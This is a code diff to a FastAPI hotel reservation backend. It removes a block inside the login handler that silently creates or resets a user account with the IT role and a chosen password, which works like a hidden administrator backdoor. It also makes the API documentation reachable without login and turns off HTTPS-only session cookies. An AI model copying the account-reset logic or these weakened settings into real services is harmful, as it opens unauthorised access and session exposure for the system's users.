@@ -53,7 +53,6 @@ app.add_middleware(
     allow_origins=[
         "http://localhost:3000",
         "http://127.0.0.1:3000",
-        "https://hotel-reservation-system.orkestr.run",
     ],
     allow_credentials=True,
     allow_methods=["*"],
@@ -403,6 +402,10 @@ def _is_public_path(path: str) -> bool:
     return (
         path == "/"
         or path == "/login"
+        # Swagger / OpenAPI documentation must be reachable before login
+        # so the backend can be tested independently from the frontend.
+        or path == "/docs"
+        or path == "/openapi.json"
         or path.startswith("/auth/google/")
         or path.startswith("/uploads/")
     )
@@ -6171,44 +6174,6 @@ async def login(
             detail="Username and password are required",
         )
 
-        async with AsyncSessionLocal() as session:
-            result = await session.execute(
-                select(User).where(
-                    User.username == target_username
-                )
-            )
-
-            user = result.scalar_one_or_none()
-
-            if user is None:
-                user = User(
-                    username=target_username,
-                    password_hash=password_hash,
-                    full_name=target_full_name,
-                    role=ROLE_IT,
-                    is_active=True,
-                )
-                session.add(user)
-                await session.flush()
-                action = "created"
-            else:
-                user.password_hash = password_hash
-                user.full_name = user.full_name or target_full_name
-                user.role = ROLE_IT
-                user.is_active = True
-                action = "reset"
-
-            await session.commit()
-            await session.refresh(user)
-
-        return {
-            "success": True,
-            "message": f"IT account {action} successfully",
-            "username": target_username,
-            "role": ROLE_IT,
-            "user_id": user.id,
-        }
-
     async with AsyncSessionLocal() as session:
 
         result = await session.execute(
@@ -6293,7 +6258,6 @@ async def login(
 
 
 # =========================================================
-# =========================================================
 # Current Session
 # =========================================================
 
@@ -6361,6 +6325,6 @@ async def logout(request: Request):
 app = SessionMiddleware(
     app,
     secret_key=SESSION_SECRET,
-    same_site="none",
-    https_only=True,
+    same_site="lax",
+    https_only=False,
 )
